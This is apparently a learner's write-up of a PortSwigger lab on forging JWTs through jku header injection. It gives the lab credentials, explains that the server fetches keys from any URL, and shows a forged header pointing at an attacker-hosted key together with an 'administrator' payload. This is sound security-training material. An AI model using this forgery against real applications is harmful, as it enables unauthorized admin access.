# Lab: JWT authentication bypass via jku header injection

Description : The server supports the `jku` parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

End Goal : privilage escalation (access admin panel)

creds : `wiener:peter`

Analysis :

- The vulnerability here is the server trusts any domain's and don't even try to use any filters like black list or white list
- it accepts any `url` and then uses it to fetch the keys
- so in order to exploit it we just created our key and hosted it in the exploit server
- then we added header in jwt
  - `"jku": "https://exploit-0a2a00ff0457f34781c247cf01820022.exploit-server.net/exploit"`
  - and also note that in the header `"kid": "189d4d98-cbaf-4348-a7fa-8be7f27ed3d5"` must match ur key in ur server as an attacker
  - finally verify ur jwt with ur key

__jwt headers__

>{
>
> "kid": "189d4d98-cbaf-4348-a7fa-8be7f27ed3d5",
>
> "alg": "RS256",
>
> "jku": "<https://exploit-0a2a00ff0457f34781c247cf01820022.exploit-server.net/exploit>"
>}

__jwt payload__
>{
>
> "iss": "portswigger",
>
> "exp": 1726955133,
>
> "sub": "administrator"
>
>}
